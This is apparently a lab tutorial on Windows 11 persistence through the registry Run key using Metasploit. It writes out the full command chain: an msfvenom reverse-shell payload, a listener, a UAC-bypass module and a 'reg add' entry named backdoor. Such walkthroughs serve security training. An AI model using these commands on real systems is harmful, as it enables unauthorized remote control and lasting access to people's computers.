# 🛡️ Windows Persistence via Registry Run Key

## 📌 Overview
This technique demonstrates how to establish persistence on a Windows 11 system by adding a malicious executable to the **Windows Registry Run key**, ensuring it executes every time the system starts.

---

## ⚠️ Disclaimer
> This project is for **educational purposes and authorized penetration testing only**.  
> Do not use these techniques on systems without proper permission.

---

## 🛠️ Lab Setup

| Component        | Details              |
|------------------|----------------------|
| Attacker Machine | Kali Linux           |
| Target Machine   | Windows 11           |
| Tool             | Metasploit Framework |

---

## 🔄 Attack Flow
Payload Creation → Delivery → Execution → Meterpreter Session
↓
Privilege Escalation (UAC Bypass)
↓
Registry Run Key Added
↓
System Restart
↓
Automatic Payload Execution → Session Re-established ✅


---

## 🚀 Step-by-Step Execution

### 1️⃣ Generate Payload

Create a reverse shell payload using `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.141 LPORT=4444 -f exe > reverse.exe

2️⃣ Transfer Payload to Target

Start a simple HTTP server on Kali:

python3 -m http.server

Download the payload on the Windows machine:

http://<attacker-ip>:8000/reverse.exe
3️⃣ Start Listener (Handler)
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.141
set LPORT 4444
run
4️⃣ Execute Payload on Target

Run reverse.exe on the Windows machine.

✅ Meterpreter session will be established.

5️⃣ Background the Session
getuid
background
6️⃣ Privilege Escalation (UAC Bypass)
search bypassuac_silentcleanup
use exploit/windows/local/bypassuac_silentcleanup
set SESSION 1
run

A new elevated session will be created.

Interact with it:

sessions -i 2
7️⃣ Add Persistence via Registry

Open shell:

shell

Add registry entry:

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "C:\Users\Administrator\Downloads\reverse.exe"

✅ This ensures the payload runs automatically at system startup.

8️⃣ Verify Persistence
Restart the target machine
Start the listener again:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.141
set LPORT 4444
run
Once the system boots → session reconnects automatically
🎯 Result

✔ Persistence successfully established
✔ Payload executes on every system startup
✔ Meterpreter session reconnects after reboot

🔐 Key Takeaways
Registry Run keys are a common persistence mechanism
Admin privileges are required for HKLM modifications
UAC bypass is often necessary
Always verify persistence after reboot
